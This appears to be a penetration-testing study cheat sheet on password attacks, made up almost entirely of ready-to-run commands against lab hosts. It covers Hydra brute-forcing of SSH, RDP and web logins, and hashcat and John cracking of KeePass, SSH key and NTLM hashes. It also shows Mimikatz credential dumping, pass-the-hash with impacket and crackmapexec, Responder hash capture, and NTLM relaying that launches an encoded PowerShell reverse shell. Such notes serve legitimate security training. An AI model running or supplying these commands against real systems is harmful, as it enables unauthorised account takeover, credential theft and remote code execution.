# Password Attacks

### Attacking Network Services Logins <a href="#attacking-network-services-logins" id="attacking-network-services-logins"></a>

```bash
#If we got user name and password we connect using ssh or RDP
#scanning ssh port
sudo nmap -sV -p 2222 192.168.50.201
sudo nmap -sV -p 22 192.168.50.201 
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
#HTTP POST Login Form
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

### Password Cracking Fundamentals <a href="#password-cracking-fundamentals" id="password-cracking-fundamentals"></a>

```bash
##Mutating Wordlists
#copying first 10 lines
head /usr/share/wordlists/rockyou.txt > demo.txt
#remove lines starts with "1" in demo password file
sed -i '/^1/d' demo.txt
#demo3.rule file contains below rules
$1 c $!
$2 c $!
$1 $2 $3 c $!
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
#prebuild hashcat rules
ls -la /usr/share/hashcat/rules/

##Cracking Methodology 
1. Extract hashes
2. Format hashes    (Find hashing also using hash-identifier or hashid or googling)
3. Calculate the cracking time    
4. Prepare wordlist
5. Attack the hash

##Password Manager
#locate the keypass databse 
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
#transfer file to our kali and crack it
ls -la Database.kdbx
keepass2john Database.kdbx > keepass.hash
cat keepass.hash
hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
#using the cracked password we can access the keypass

##SSH Private Key Passphrase
#when we got ssh_rsa key and when we try to login, it may ask for passphrase, so we have to crack it
ssh2john id_rsa > ssh.hash
cat ssh.hash
hashcat -h | grep -i "ssh"
#ssh.rule contains below code
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
#craching ssh hash using hashcat
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
#cracking using john
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
#after successfully cracking password we can login to ssh
```

### Working with Password Hashes <a href="#working-with-password-hashes" id="working-with-password-hashes"></a>

```bash
##Cracking NTLM
Get-LocalUser
#we will use mimikatz.exe to get stored credentials on the system.
#To run mimikatz.exe, first open powershell as "Run as Administrator", then run below commads
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
#we will get the hashes from above where we can crack those hashes
hashcat --help | grep -i "ntlm" 
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
#if we crack the hash we can use it in further attacks

##Passing NTLM
#we will use mimikatz.exe to get stored credentials on the system.
#To run mimikatz.exe, first open powershell as "Run as Administrator", then run below commads
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
#we will pass these hashes to another accounts
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
crackmapexec smb 192.168.x.x/24 -u "Frank Castle" -H 54vbfgb564bddfb --local-auth
psexec.py "Frank castle"@192.168.x.x -hashes bvsbvf:vfhbvfd 

##Cracking Net-NTLMv2
#if you run responder and wait for some time, you may get ntlmv2 hashes
sudo responder -I tap0
#or we can run below as well from victim machine cmd (instead of waiting)
dir \\192.168.119.2\test
#once you have NTLMv2 hashes in any possible way you can try to crack those
hashcat --help | grep -i "ntlm"
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force


##Relaying Net-NTLMv2
#here "-enc" is encoded version of PowerShell reverse shell one-liner(#converting command to base64 in web file upload attacks secton)
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
#now start the listerner
nc -nvlp 8080
#if any trigger happens we may get shell in the victim
#or we can run below as well from victim machine cmd (instead of waiting)
dir \\192.168.119.2\test
#via this attack we may get privileged access
```
